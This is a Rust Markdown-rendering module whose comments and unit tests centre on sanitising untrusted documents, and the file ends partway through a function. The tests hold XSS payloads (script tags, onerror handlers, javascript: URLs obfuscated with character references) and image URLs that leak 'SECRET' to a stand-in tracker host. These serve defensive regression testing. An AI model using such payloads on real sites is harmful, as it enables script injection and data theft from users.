//! Markdown rendering — the port of `src/server/markdown.ts`.
//!
//! The TypeScript build parses with `marked` (GitHub-flavoured, `breaks` off) and keeps two guarantees on top of it,
//! because a document is untrusted text — from a model, a repository, or a person. The Rust port parses with a GFM
//! library (chosen in the crate's `INDEX.md`) and keeps the same two, with the same tests:
//!
//! 1. **The library's output is reduced to an allow-list** of elements and attributes ([`crate::sanitize`]), so a
//!    document cannot produce a tag of its own. Raw HTML in a document is passed through by the parser and reduced
//!    there, like everything else.
//! 2. **A link's scheme is checked** ([`safe_url`]): relative targets, fragments, `http`, `https` and `mailto`
//!    survive; a refused link keeps its label with ` (link refused)` beside it, and a refused image becomes its alt
//!    text.
//!
//! And the conventions this repository's documents need, each one a measured defect in the TypeScript history:
//!
//! - a leading YAML block is lifted into `<section class="frontmatter"><h2>frontmatter</h2><pre><code>…`;
//! - a lone leading `_` (as in `_tools_`) is escaped so a folder name keeps its underscores, outside code;
//! - a fence is highlighted by [`crate::highlight`] with `class="language-<name>"` on its `<code>`;
//! - a relative link or image resolves against the document's folder ([`MarkdownOptions::base`]) to
//!   `/api/raw?path=<encoded absolute path>`, and a link additionally carries the absolute path in
//!   [`LINK_DATA_ATTRIBUTE`] so the page opens it in the panel instead of navigating away;
//! - a remote link gets `target="_blank" rel="noreferrer noopener"`; a `data:` image is not resolved.

use std::path::Path;

use crate::sanitize::UrlSite;

/// The attribute a link to a workspace file carries the absolute path in, so the page can open it in the panel.
pub const LINK_DATA_ATTRIBUTE: &str = "data-heddle-path";

/// Escape the five characters that can start a tag, an entity, or a quote break-out: `& < > " '` become
/// `&amp; &lt; &gt; &quot; &#39;`.
pub fn escape_html(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    for character in text.chars() {
        match character {
            '&' => out.push_str("&amp;"),
            '<' => out.push_str("&lt;"),
            '>' => out.push_str("&gt;"),
            '"' => out.push_str("&quot;"),
            '\'' => out.push_str("&#39;"),
            other => out.push(other),
        }
    }
    out
}

/// Whether a link's target may be followed, and the trimmed target when it may.
///
/// `None` for an empty target and for any scheme other than `http`, `https` and `mailto` (compared
/// case-insensitively); a target with no scheme — relative, absolute-path, fragment — is returned trimmed.
///
/// The target is judged as a browser's URL parser reads it (WHATWG URL), which trims C0 controls and spaces at
/// both ends and **drops tab and newline wherever they are**. So the ends are trimmed of both those and JavaScript's
/// white space, and a target still holding a tab, newline or carriage return is refused: `java<TAB>script:` had no
/// scheme to [`scheme_of`] and passed as a relative path, while the browser followed `javascript:` (live issue
/// developer-two-6). A URL meant literally never holds those characters raw. The TypeScript `safeUrl` decides the same.
pub fn safe_url(url: &str) -> Option<&str> {
    let trimmed = url.trim_matches(|character: char| {
        character <= '\u{20}'
            || (character.is_whitespace() && character != '\u{85}')
            || character == '\u{feff}'
    });
    if trimmed.is_empty() || trimmed.contains(['\t', '\n', '\r']) {
        return None;
    }
    match scheme_of(trimmed) {
        None => Some(trimmed),
        Some(scheme)
            if ["http", "https", "mailto"]
                .iter()
                .any(|allowed| scheme.eq_ignore_ascii_case(allowed)) =>
        {
            Some(trimmed)
        }
        Some(_) => None,
    }
}

/// The scheme of `url` when it starts with one — `/^[a-z][a-z0-9+.-]*:/i` — without its colon.
pub(crate) fn scheme_of(url: &str) -> Option<&str> {
    let mut characters = url.char_indices();
    match characters.next() {
        Some((_, first)) if first.is_ascii_alphabetic() => {}
        _ => return None,
    }
    for (index, character) in characters {
        if character == ':' {
            return Some(&url[..index]);
        }
        if !(character.is_ascii_alphanumeric() || matches!(character, '+' | '.' | '-')) {
            return None;
        }
    }
    None
}

/// JavaScript's `String.prototype.trim`.
///
/// JavaScript trims white space and line terminators; `char::is_whitespace` (Unicode `White_Space`) is the same set
/// except that it also holds U+0085 NEXT LINE, which JavaScript keeps, and lacks U+FEFF, which JavaScript trims.
pub(crate) fn trim_js(text: &str) -> &str {
    text.trim_matches(|character: char| {
        (character.is_whitespace() && character != '\u{85}') || character == '\u{feff}'
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn escape_html_escapes_exactly_the_five_characters() {
        assert_eq!(
            escape_html(r#"<a href="x">Tom & 'Jerry'</a>"#),
            "&lt;a href=&quot;x&quot;&gt;Tom &amp; &#39;Jerry&#39;&lt;/a&gt;"
        );
        assert_eq!(escape_html("plain 文字 text"), "plain 文字 text");
        assert_eq!(
            escape_html("&amp;"),
            "&amp;amp;",
            "an entity is text, escaped again"
        );
    }

    #[test]
    fn safe_url_keeps_relative_targets_and_three_schemes() {
        assert_eq!(safe_url("  README.md "), Some("README.md"));
        assert_eq!(safe_url("#section"), Some("#section"));
        assert_eq!(safe_url("/abs/path"), Some("/abs/path"));
        assert_eq!(safe_url("HTTPS://example.com"), Some("HTTPS://example.com"));
        assert_eq!(safe_url("mailto:a@b.c"), Some("mailto:a@b.c"));
        assert_eq!(
            safe_url("./a:b"),
            Some("./a:b"),
            "a colon after a non-scheme character is not a scheme"
        );
    }

    #[test]
    fn safe_url_refuses_other_schemes_and_emptiness() {
        assert_eq!(safe_url("javascript:alert(1)"), None);
        assert_eq!(safe_url(" JavaScript:alert(1)"), None);
        assert_eq!(safe_url("data:text/html;base64,AAAA"), None);
        assert_eq!(safe_url("vbscript:x"), None);
        assert_eq!(safe_url("   "), None);
        assert_eq!(safe_url(""), None);
    }

    #[test]
    fn trim_js_matches_javascript_white_space() {
        assert_eq!(trim_js("\u{feff}\t x \u{2028}"), "x");
        assert_eq!(
            trim_js("\u{85}x"),
            "\u{85}x",
            "NEXT LINE is not white space to JavaScript"
        );
    }

    fn render(source: &str) -> String {
        render_markdown(source, MarkdownOptions::default())
    }

    fn render_at(path: &str, source: &str) -> String {
        // `base` is the document's own **folder**, which is what `render_source` passes.
        render_markdown(
            source,
            MarkdownOptions {
                base: Path::new(path).parent(),
                remote_images: true,
            },
        )
    }

    /// Remove every tag, leaving the text a reader would see (entities still encoded).
    fn strip_tags(html: &str) -> String {
        let mut out = String::with_capacity(html.len());
        let mut in_tag = false;
        for character in html.chars() {
            match character {
                '<' => in_tag = true,
                '>' if in_tag => in_tag = false,
                other if !in_tag => out.push(other),
                _ => {}
            }
        }
        out
    }

    #[test]
    fn a_document_cannot_inject_markup() {
        let html = render("Hello <script>alert(1)</script> and <img src=/x.png onerror=alert(1)>");
        assert!(!html.contains("<script"), "no script tag survives: {html}");
        assert!(
            !html.contains("alert(1)"),
            "and its content is dropped: {html}"
        );
        assert!(
            !html.contains("onerror"),
            "an event handler cannot survive: {html}"
        );
        // An answer's image is a local file, served by the file route (live issue developer-two-7).
        assert!(
            html.contains("<img src=\"/api/raw?path=%2Fx.png\">"),
            "the allowed attribute stays: {html}"
        );
    }

    #[test]
    fn a_link_that_would_run_script_is_refused_and_the_label_survives() {
        let html = render("[click](javascript:alert(1))");
        assert!(!html.contains("<a "), "no anchor is produced: {html}");
        assert!(
            html.contains("click (link refused)"),
            "the label and the reason: {html}"
        );
        assert!(
            !render("[x](data:text/html,<script>alert(1)</script>)").contains("<a "),
            "a data URL is refused too"
        );
        for url in [
            "https://example.com/a",
            "http://example.com",
            "mailto:someone@example.com",
            "docs/INDEX.md",
            "#a-heading",
        ] {
            assert!(
                render(&format!("[label]({url})")).contains("<a href="),
                "{url} is followed"
            );
        }
    }

    #[test]
    fn a_refused_link_keeps_its_rendered_label() {
        let html = render("[**danger**](javascript:alert(1))");
        assert!(!html.contains("<a "), "no anchor is produced: {html}");
        assert!(
            html.contains("<strong>danger</strong> (link refused)"),
            "the label is rendered, with the reason: {html}"
        );
    }

    #[test]
    fn headings_paragraphs_and_rules() {
        let html = render("# Title\n\nA paragraph.\n\n---\n\n## Second\n");
        assert!(html.contains("<h1>Title</h1>"), "{html}");
        assert!(html.contains("<p>A paragraph.</p>"), "{html}");
        assert!(html.contains("<hr />") || html.contains("<hr>"), "{html}");
        assert!(html.contains("<h2>Second</h2>"), "{html}");
    }

    #[test]
    fn emphasis_code_spans_and_strikethrough() {
        let html = render("Use **bold**, *italic*, `code`, and ~~gone~~.");
        assert!(html.contains("<strong>bold</strong>"), "{html}");
        assert!(html.contains("<em>italic</em>"), "{html}");
        assert!(html.contains("<code>code</code>"), "{html}");
        assert!(html.contains("<del>gone</del>"), "{html}");
    }

    #[test]
    fn emphasis_inside_a_code_span_stays_literal() {
        let html = render("The literal `a ** b` is multiplication.");
        assert!(
            html.contains("<code>a ** b</code>"),
            "the asterisks survive: {html}"
        );
        assert!(!html.contains("<strong>"), "and nothing is bolded: {html}");
    }

    #[test]
    fn a_fenced_block_keeps_its_language_and_its_text_exactly() {
        let html = render("```ts\nconst x: number = 1 < 2 ? a : b\n```");
        assert!(
            html.contains("<pre><code class=\"language-ts\">"),
            "the language is carried: {html}"
        );
        assert!(
            !html.contains("&amp;lt;"),
            "and the escaping is not applied twice: {html}"
        );
        let text = strip_tags(&html);
        assert!(
            text.trim() == "const x: number = 1 &lt; 2 ? a : b",
            "the code reads as it was written: {text:?} from {html}"
        );
    }

    #[test]
    fn a_fence_is_coloured_and_its_class_survives_the_allow_list() {
        let html = render("```python\ndef f(x):\n    return x if x else None\n```");
        assert!(
            html.contains("<pre><code class=\"language-python\">"),
            "{html}"
        );
        assert!(
            html.contains("hljs-keyword"),
            "the highlighter's spans survive: {html}"
        );
        assert!(
            !html.contains("<span onclick"),
            "and nothing forbidden gets through: {html}"
        );
    }

    #[test]
    fn an_unterminated_fence_still_renders_its_content() {
        let html = render("```\nno closing fence\n");
        assert!(html.contains("no closing fence"), "{html}");
        assert!(html.contains("<pre><code>"), "{html}");
    }

    #[test]
    fn consecutive_items_join_one_list() {
        let html = render("- one\n- two\n\n1. first\n2. second\n");
        assert_eq!(html.matches("<ul>").count(), 1, "{html}");
        assert_eq!(html.matches("<ol>").count(), 1, "{html}");
        assert_eq!(html.matches("<li>").count(), 4, "{html}");
    }

    #[test]
    fn a_table_renders_as_a_table_with_alignment() {
        let html = render(
            "| Part | Claims | State |\n| --- | ---: | :---: |\n| 1 | 10 | holds |\n| 2 | 6 | holds |\n",
        );
        assert_eq!(html.matches("<table>").count(), 1, "{html}");
        assert_eq!(
            html.matches("<th").count() - html.matches("<thead>").count(),
            3,
            "{html}"
        );
        assert_eq!(html.matches("<td").count(), 6, "{html}");
        assert!(html.contains("<th>Part</th>"), "{html}");
        assert!(
            html.contains("align=\"right\"") && html.contains(">Claims<"),
            "a right-aligned column says so: {html}"
        );
        assert!(
            html.contains("align=\"center\"") && html.contains(">State<"),
            "and a centred one: {html}"
        );
        assert!(!html.contains('|'), "no pipe is left as text: {html}");
    }

    #[test]
    fn a_table_is_not_read_where_there_is_no_delimiter_row() {
        let html = render("| a | b |\n| c | d |\n");
        assert!(!html.contains("<table>"), "no table is invented: {html}");
        assert!(
            html.contains("| a | b |"),
            "the text is shown as written: {html}"
        );
    }

    #[test]
    fn a_bolded_tag_does_not_become_a_tag() {
        let html = render("**<b>not bold</b>**");
        assert!(html.contains("<strong>not bold</strong>"), "{html}");
        assert!(
            !html.contains("<b>"),
            "the element the document wrote does not survive: {html}"
        );
    }

    #[test]
    fn a_documents_frontmatter_is_shown_as_metadata() {
        let html = render("---\ntitle: A Document\nversion: 1.0.0\n---\n\n# Heading\n\nBody.\n");
        assert!(
            html.contains("<section class=\"frontmatter\"><h2>frontmatter</h2><pre><code>"),
            "{html}"
        );
        assert!(html.contains("title: A Document"), "{html}");
        assert!(
            !html.contains("<p>title:"),
            "not rendered as a paragraph: {html}"
        );
        assert!(html.contains("<h1>Heading</h1>"), "{html}");
        assert!(
            !render("# Plain\n").contains("frontmatter"),
            "no frontmatter, no section"
        );
        assert!(
            render("text\n\n---\n\nmore").contains("<hr"),
            "a rule later is still a rule"
        );
    }

    #[test]
    fn a_name_that_begins_with_an_underscore_keeps_its_underscores() {
        assert!(
            render("# _tools_").contains("<h1>_tools_</h1>"),
            "a heading keeps the name"
        );
        assert!(
            render("See _verifiers_ for that.").contains("_verifiers_"),
            "and so does a sentence"
        );
        assert!(!render("_tools_").contains("<em>"), "nothing is emphasised");
        assert!(
            render("*italic* and **bold**").contains("<em>italic</em>"),
            "asterisks still emphasise"
        );
        assert!(
            render("a_b_c").contains("a_b_c"),
            "an underscore in a word was never at risk"
        );
    }

    #[test]
    fn an_escape_for_a_name_never_becomes_visible_inside_code() {
        let fenced = render("```python\nx = _a_b_\n```");
        assert!(
            !fenced.contains("\\_"),
            "no backslash reaches the fence: {fenced}"
        );
        assert!(fenced.contains("_a_b_"), "{fenced}");
        let span = render("the `_tools_` folder");
        assert!(!span.contains("\\_"), "{span}");
        assert!(span.contains("<code>_tools_</code>"), "{span}");
    }

    #[test]
    fn a_code_span_inside_link_text_is_code_not_literal_backticks() {
        let html = render("See [`_verifiers_/`](_verifiers_/INDEX.md) here.");
        assert!(
            html.contains("<code>_verifiers_/</code>"),
            "the label is a code element: {html}"
        );
        assert!(
            !html.contains("`"),
            "and no backtick survives as text: {html}"
        );
        assert!(
            render("[**bold** label](a.md)").contains("<strong>bold</strong> label"),
            "emphasis in a label"
        );
    }

    #[test]
    fn a_link_to_a_workspace_file_is_served_and_marked_for_the_panel() {
        // Measured in the TypeScript build: `[x](DEPLOY.md)` asked for `/DEPLOY.md`, which answered 404.
        let html = render_at("/w/docs/notes.md", "See [the index](../INDEX.md#part-two).");
        assert!(
            html.contains("href=\"/api/raw?path=%2Fw%2FINDEX.md#part-two\""),
            "the address is the route that serves the file: {html}"
        );
        assert!(
            html.contains("data-heddle-path=\"/w/INDEX.md\""),
            "with the absolute path for the panel to follow: {html}"
        );
        assert!(html.contains("rel=\"noreferrer noopener\""), "{html}");
    }

    #[test]
    fn a_remote_link_opens_beside_the_document() {
        let html = render_at("/w/a.md", "[out](https://example.com/x)");
        assert!(html.contains("href=\"https://example.com/x\""), "{html}");
        assert!(
            html.contains("target=\"_blank\""),
            "it opens in a new tab: {html}"
        );
        assert!(html.contains("rel=\"noreferrer noopener\""), "{html}");
    }

    #[test]
    fn an_image_is_resolved_beside_the_document() {
        let html = render_at("/w/_context_/notes.md", "![icon](heddle.svg)");
        assert!(
            html.contains("src=\"/api/raw?path=%2Fw%2F_context_%2Fheddle.svg\""),
            "the image is fetched from the route that serves it: {html}"
        );
        assert!(html.contains("alt=\"icon\""), "{html}");
        // A remote image is the author's choice and is left as written.
        assert!(
            render_at("/w/a.md", "![x](https://example.com/a.png)")
                .contains("src=\"https://example.com/a.png\""),
            "a remote image is untouched"
        );
    }

    /// Every `href` and `src` the page would follow, read as the browser reads it: references decoded, tab and
    /// newline dropped.
    fn followed(html: &str) -> Vec<String> {
        let mut urls = Vec::new();
        for attribute in [" href=\"", " src=\""] {
            let mut rest = html;
            while let Some(at) = rest.find(attribute) {
                let value = &rest[at + attribute.len()..];
                let end = value.find('"').unwrap_or(value.len());
                let decoded = crate::sanitize::decode_character_references(&value[..end]);
                urls.push(decoded.replace(['\t', '\n', '\r'], "").trim().to_string());
                rest = &value[end..];
            }
        }
        urls
    }

    #[test]
    fn a_link_whose_scheme_is_hidden_behind_character_references_is_refused() {
        // Live issue developer-two-6 (P0): a raw HTML href was judged as written, so each of these reached the page
        // unchanged and decoded there into a script or data URL. The TypeScript test holds the same list.
        for source in [
            "<a href=\"&#x6A;avascript:alert(1)\">a</a>",
            "<a href=\"&#106;avascript:alert(1)\">b</a>",
            "<a href=\"&#0000106;avascript:alert(1)\">c</a>",
            "<a href=\"&#x6Aavascript:alert(1)\">no semicolon</a>",
            "<a href=\"java&#x09;script:alert(1)\">d</a>",
            "<a href=\"java&Tab;script:alert(1)\">e</a>",
            "<a href=\"javascript&colon;alert(1)\">f</a>",
            "<a href=\"&#x64;ata:text/html,x\">g</a>",
            "<a href=\"&#32;javascript:alert(1)\">leading space</a>",
            "<a href=\"vb&#x73;cript:x\">h</a>",
        ] {
            let html = render(source);
            for url in followed(&html) {
                let lower = url.to_ascii_lowercase();
                assert!(
                    !lower.starts_with("javascript:")
                        && !lower.starts_with("data:")
                        && !lower.starts_with("vbscript:"),
                    "{source} must not reach the page as {url}: {html}"
                );
            }
        }
        // What a document legitimately links to is kept, references and all.
        let kept = render("<a href=\"https://example.com/?a=1&amp;b=2\">x</a>");
        assert_eq!(followed(&kept), ["https://example.com/?a=1&b=2"]);
        assert!(
            kept.contains("href=\"https://example.com/?a=1&amp;b=2\""),
            "{kept}"
        );
        assert_eq!(
            followed(&render("<a href=\"mailto:a&#64;b.example\">x</a>")),
            ["mailto:a@b.example"]
        );
    }

    #[test]
    fn an_answer_shows_only_local_images() {
        // Live issue developer-two-7 (P0): an answer's remote image was fetched the moment it was drawn, a no-click
        // channel out. DSH's `localPathMediaUrl` resolves an image to its file API or not at all.
        for source in [
            "![x](https://tracker.example/p.png?d=SECRET)",
            "<img src=\"https://tracker.example/p.png?d=SECRET\">",
            "![x](//tracker.example/p.png)",
            "<img src=\"//tracker.example/p.png\">",
            "<img src=\"&#x2F;&#x2F;tracker.example/p.png\">",
            "<img src=\"http&#x3A;//tracker.example/p.png\">",
        ] {
            let html = render(source);
            assert!(
                !followed(&html).iter().any(|url| {
                    let after_scheme =
                        scheme_of(url).map_or(url.as_str(), |scheme| &url[scheme.len() + 1..]);
                    after_scheme.starts_with("//")
                }),
                "{source} fetches nothing remote: {html}"
            );
        }
        assert!(
            render("![x](https://tracker.example/p.png)").contains("<p>x</p>"),
            "a refused image is its alt text"
        );
        assert!(
            render("![x](/api/sessions)").contains("src=\"/api/raw?path=%2Fapi%2Fsessions\""),
            "an absolute path is a file, not an API of the answer's choosing"
        );
        assert!(
            render("![plot](/w/plot.png)").contains("src=\"/api/raw?path=%2Fw%2Fplot.png\""),
            "a local image still shows"
        );
        assert!(
            render("<img src=\"/w/plot.png\">").contains("src=\"/api/raw?path=%2Fw%2Fplot.png\""),
            "a hand-written local image is served once, not wrapped twice"
        );
        assert!(
            followed(&render("![p](plot.png)")).is_empty(),
            "a relative image with no folder to resolve against is not fetched"
        );
    }

    #[test]
    fn a_raw_html_image_is_resolved_by_the_allow_lists_policy() {
        // Raw HTML goes around the renderer, so the sanitiser's policy is the one that resolves it.
        let html = render_at(
            "/w/docs/notes.md",
            "<p align=\"center\"><img src=\"heddle.svg\" width=\"160\"></p>",
        );
        assert!(
            html.contains("src=\"/api/raw?path=%2Fw%2Fdocs%2Fheddle.svg\""),
            "a hand-written image is resolved too: {html}"
        );
        assert!(
            html.contains("width=\"160\""),
            "and keeps a count of pixels: {html}"
        );
    }

    #[test]
    fn an_image_with_a_refused_source_becomes_its_alt_text() {
        let html = render_at("/w/a.md", "![the icon](javascript:alert(1))");
        assert!(!html.contains("<img"), "nothing is fetched: {html}");
        assert!(
            html.contains("the icon"),
            "and the author's words still read: {html}"
        );
    }

    #[test]
    fn a_bare_url_is_an_autolink() {
        // The GFM behaviour the library choice was made for: a document's bare URL is a link, as GitHub renders it.
        let html = render("See https://example.com/x for that.");
        assert!(html.contains("href=\"https://example.com/x\""), "{html}");
    }

    #[test]
    fn a_task_list_is_a_list_with_boxes() {
        let html = render("- [x] done\n- [ ] todo\n");
        assert!(html.contains("<ul>"), "{html}");
        assert!(
            html.contains("type=\"checkbox\""),
            "a task list has boxes: {html}"
        );
        assert!(
            html.contains("checked"),
            "and a done item is checked: {html}"
        );
    }

    #[test]
    fn a_footnote_is_a_reference_and_its_definition() {
        let html = render("A claim[^1].\n\n[^1]: the source\n");
        assert!(
            html.contains("footnote"),
            "a footnote keeps its machinery: {html}"
        );
        assert!(html.contains("the source"), "{html}");
    }

    #[test]
    fn a_reference_link_is_followed_and_rewritten() {
        let html = render_at(
            "/w/docs/a.md",
            "See [the index][ref].\n\n[ref]: ../INDEX.md\n",
        );
        assert!(
            html.contains("href=\"/api/raw?path=%2Fw%2FINDEX.md\""),
            "a reference link resolves like an inline one: {html}"
        );
        assert!(html.contains("data-heddle-path=\"/w/INDEX.md\""), "{html}");
    }

    #[test]
    fn a_link_title_survives_as_an_attribute() {
        let html = render_at("/w/a.md", "[x](https://e.example \"the title\")");
        assert!(html.contains("title=\"the title\""), "{html}");
        assert!(html.contains("target=\"_blank\""), "{html}");
    }

    #[test]
    fn an_image_inside_a_link_keeps_both_resolutions() {
        let html = render_at("/w/docs/a.md", "[![diagram](shot.png)](../INDEX.md)");
        assert!(
            html.contains("src=\"/api/raw?path=%2Fw%2Fdocs%2Fshot.png\""),
            "the image is served beside the document: {html}"
        );
        assert!(
            html.contains("href=\"/api/raw?path=%2Fw%2FINDEX.md\""),
            "and the link it sits in is served too: {html}"
        );
        assert!(html.contains("data-heddle-path=\"/w/INDEX.md\""), "{html}");
    }

    #[test]
    fn a_title_holding_a_greater_than_sign_does_not_end_its_tag_early() {
        // `tag_end` and `attribute_value` scan the tag rather than splitting on '>', which is what this pins.
        let html = render_at("/w/a.md", "[x](https://e.example \"a > b\")");
        assert!(html.contains("title=\"a &gt; b\""), "{html}");
        assert!(
            html.contains("rel=\"noreferrer noopener\""),
            "the tag is still annotated: {html}"
        );
    }

    #[test]
    fn nested_emphasis_and_strikethrough_inside_a_heading() {
        let html = render("# **bold _and_ `code`**\n");
        assert!(html.contains("<h1>"), "{html}");
        assert!(html.contains("<strong>"), "{html}");
        assert!(html.contains("<code>code</code>"), "{html}");
    }

    #[test]
    fn a_blockquote_holding_code_keeps_both() {
        let html = render("> quoted\n>\n> ```py\n> x = 1\n> ```\n");
        assert!(html.contains("<blockquote>"), "{html}");
        assert!(html.contains("<pre><code"), "{html}");
        assert!(html.contains("language-py"), "{html}");
    }

    #[test]
    fn a_hard_break_and_a_soft_break_are_not_confused() {
        // `breaks` stays off, as in the TypeScript build: a soft break is a space, a two-space break is a `<br>`.
        let soft = render("one\ntwo\n");
        assert!(
            soft.contains("one two") || soft.contains("one\ntwo"),
            "{soft}"
        );
        assert!(
            !soft.contains("<br"),
            "a soft break is not a line break: {soft}"
        );
        let hard = render("one  \ntwo\n");
        assert!(
            hard.contains("<br"),
            "two trailing spaces are a line break: {hard}"
        );
    }

    #[test]
    fn render_inline_answers_spans_only() {
        let html = render_inline("Use **bold** and `code`");
        assert!(!html.contains("<p>"), "no paragraph wrapper: {html}");
        assert!(html.contains("<strong>bold</strong>"), "{html}");
        assert!(html.contains("<code>code</code>"), "{html}");
        assert_eq!(render_inline("plain"), "plain");
        assert_eq!(
            render_inline("[x](javascript:alert(1))"),
            "<a>x</a>",
            "an inline link loses its refused address, as the TypeScript build's does"
        );
    }

    #[test]
    fn rendering_is_repeatable_and_empty_input_is_empty_output() {
        let source = "# A\n\ntext with `code`\n";
        assert_eq!(render(source), render(source), "no state to drift");
        assert_eq!(render(""), "", "nothing in gives nothing out");
    }

    #[test]
    fn resolve_against_normalises_and_never_climbs_above_the_root() {
        assert_eq!(
            resolve_against(Path::new("/w/docs"), "../INDEX.md"),
            "/w/INDEX.md"
        );
        assert_eq!(resolve_against(Path::new("/w"), "../../x"), "/x");
        assert_eq!(resolve_against(Path::new("/w"), "./a/./b"), "/w/a/b");
        assert_eq!(resolve_against(Path::new("/"), "a"), "/a");
    }

    #[test]
    fn percent_encoding_matches_encode_uri_component() {
        assert_eq!(
            percent_encode("/w/a b/文字.md"),
            "%2Fw%2Fa%20b%2F%E6%96%87%E5%AD%97.md"
        );
        assert_eq!(percent_encode("-_.!~*'()"), "-_.!~*'()");
        assert_eq!(percent_decode("%2Fw%2Fa%20b"), "/w/a b");
        assert_eq!(
            percent_decode("100%"),
            "100%",
            "a stray percent is left as written"
        );
    }

    #[test]
    fn split_frontmatter_matches_the_typescript_expression() {
        assert_eq!(
            split_frontmatter("---\na: 1\n---\nbody"),
            (Some("a: 1"), "body")
        );
        assert_eq!(split_frontmatter("---\na: 1\n---"), (Some("a: 1"), ""));
        assert_eq!(
            split_frontmatter("no frontmatter"),
            (None, "no frontmatter")
        );
        assert_eq!(
            split_frontmatter("---\nnot closed\n"),
            (None, "---\nnot closed\n"),
            "an unclosed block is left to the parser"
        );
    }

    #[test]
    fn a_line_opens_at_most_max_nesting_containers_and_the_rest_reads_as_text() {
        // Live issues developer-two-15 (P0, this server aborted) and -16 (TypeScript failed the session view).
        assert_eq!(MAX_NESTING, 100);
        assert_eq!(
            bound_nesting(&format!("{} x", ">".repeat(102))),
            format!("{}\\>> x", ">".repeat(100)),
            "the 101st quote marker is escaped"
        );
        assert_eq!(
            bound_nesting(&format!("{}x", "- ".repeat(101))),
            format!("{}\\- x", "- ".repeat(100)),
            "and the 101st bullet"
        );
        assert_eq!(
            bound_nesting(&format!("{}x", "1. ".repeat(101))),
            format!("{}1\\. x", "1. ".repeat(100)),
            "and the 101st number keeps its digits"
        );
        let ordinary = "> quote\n> > nested\n- a\n  - b";
        assert_eq!(
            bound_nesting(ordinary),
            ordinary,
            "ordinary nesting is untouched"
        );
        assert_eq!(
            bound_nesting(&format!("```\n{}\n```", ">".repeat(102))),
            format!("```\n{}\\>>\n```", ">".repeat(100)),
            "a line inside a code fence is bounded too, so no fence test can switch the bound off"
        );
    }

    #[test]
    fn a_line_that_only_looks_like_a_fence_does_not_switch_the_bound_off() {
        // developer-three's review: four spaces make an indented code block, and a backtick fence's info string has
        // no backtick.
        for opener in ["    ```", "``` a`b", "```", "~~~"] {
            let bounded = bound_nesting(&format!("{opener}\n\n{} x", ">".repeat(200)));
            assert!(
                !bounded.contains(&">".repeat(MAX_NESTING + 1)),
                "{opener:?}"
            );
        }
    }

    #[test]
    fn a_line_keeps_at_most_max_indent_columns_of_indentation() {
        assert_eq!(MAX_INDENT, 200);
        assert_eq!(
            bound_nesting(&format!("{}- x", " ".repeat(300))),
            format!("{}- x", " ".repeat(200))
        );
        assert_eq!(
            bound_nesting(&format!("{}- x", "\t".repeat(60))),
            format!("{}- x", " ".repeat(200)),
            "a tab reaches the next multiple of four"
        );
        let edge = format!("{}- x", " ".repeat(200));
        assert_eq!(
            bound_nesting(&edge),
            edge,
            "up to the bound a line is untouched"
        );
    }

    #[test]
    fn deep_inline_nesting_mixed_containers_and_a_deeply_indented_list_all_render() {
        // developer-three's test material: none of these is bounded by counting markers, so the guards must hold.
        let indented: Vec<String> = (0..3000)
            .map(|level| format!("{}- {level}", "  ".repeat(level)))
            .collect();
        let cases = [
            (
                "stars",
                format!("{}x{}", "*".repeat(20_000), "*".repeat(20_000)),
            ),
            (
                "brackets",
                format!("{}x{}", "[".repeat(20_000), "]".repeat(20_000)),
            ),
            (
                "underscores",
                format!("{}x{}", "_".repeat(20_000), "_".repeat(20_000)),
            ),
            ("mixed", format!("{}x", "> - 1. ".repeat(20_000))),
            ("indented", indented.join("\n")),
        ];
        for (name, source) in &cases {
            let html = render_markdown(source, MarkdownOptions::default());
            assert!(!html.is_empty(), "{name}");
        }
        let html = render_markdown(&cases[4].1, MarkdownOptions::default());
        assert!(
            html.matches("<ul>").count() <= MAX_NESTING + 1,
            "an indented list nests at a bounded depth"
        );
    }

    #[test]
    fn fifty_thousand_nested_quotes_or_list_items_render_at_a_bounded_depth() {
        // Before the fix this test aborted the whole test binary: the stack overflowed inside comrak.
        let quotes = render_markdown(
            &format!("{} x", ">".repeat(50_000)),
            MarkdownOptions::default(),
        );
        assert_eq!(
            quotes.matches("<blockquote>").count(),
            100,
            "one hundred quotes, the rest as text"
        );
        let bullets = render_markdown(
            &format!("{}x", "- ".repeat(20_000)),
            MarkdownOptions::default(),
        );
        // comrak caps list nesting at 99 of its own (the TypeScript build draws 100); either way it is bounded.
        let lists = bullets.matches("<ul>").count();
        assert!(lists <= MAX_NESTING, "{lists} nested lists");
        assert!(
            !render_inline(&">".repeat(50_000)).is_empty(),
            "an inline span renders too"
        );
    }

    #[test]
    fn deep_inline_nesting_renders_on_the_render_stack_without_stopping_the_server() {
        // Not bounded line by line, so it is the render stack that keeps this from aborting the process.
        let source = format!("{}<b>x</b>{}", "*a ".repeat(5_000), " a*".repeat(5_000));
        let html = render_markdown(&source, MarkdownOptions::default());
        assert!(!html.is_empty());
        assert!(
            !html.contains("<b>"),
            "raw HTML is still judged: {}",
            &html[..html.len().min(200)]
        );
    }
}

/// Per-document rendering options.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
pub struct MarkdownOptions<'a> {
    /// The document's own folder: relative links and images resolve against it. `None` leaves them as written —
    /// which is what a transcript row and `POST /api/markdown` want, since that text has no folder.
    ///
    /// Passed per call, where the TypeScript build used a module-level variable set before each parse; the Rust
    /// renderer is therefore safe to call from several requests at once.
    pub base: Option<&'a Path>,
    /// Whether an image may come from another host: a document's preview keeps its author's remote image as written;
    /// an answer (`false`, the default) shows only local files ([`image_source`]), as the TypeScript `remoteImages`.
    pub remote_images: bool,
}

/// Render a document to sanitized HTML.
///
/// `\r\n` and `\r` become `\n` first; a leading `---\n…\n---` block becomes the frontmatter section; the rest is
/// parsed as GFM (tables, task lists, strikethrough, autolinks; a single newline is a space) and the whole output
/// passes through [`crate::sanitize::sanitize_html`] with a URL policy that applies [`safe_url`] and resolves
/// relative references against `options.base` — for raw HTML tags as well as for markdown links and images.
pub const MAX_PARSE_BYTES: usize = 64 * 1024;
pub const MAX_INLINE_MARKERS: usize = 512;

/// Conservative parser work budget shared with TypeScript. Over-budget input is shown escaped without parsing.
/// Count syntax even inside code: recognizing code would itself require parsing untrusted input first.
pub fn within_parse_budget(text: &str) -> bool {
    text.len() <= MAX_PARSE_BYTES
        && text
            .bytes()
            .filter(|byte| matches!(byte, b'*' | b'_' | b'[' | b']' | b'`' | b'~'))
            .take(MAX_INLINE_MARKERS + 1)
            .count()
            <= MAX_INLINE_MARKERS
}

pub fn render_markdown(source: &str, options: MarkdownOptions<'_>) -> String {
    if !within_parse_budget(source) {
        return unrendered(&source.replace("\r\n", "\n").replace('\r', "\n"));
    }
    on_render_stack(|| render_markdown_here(source, options))
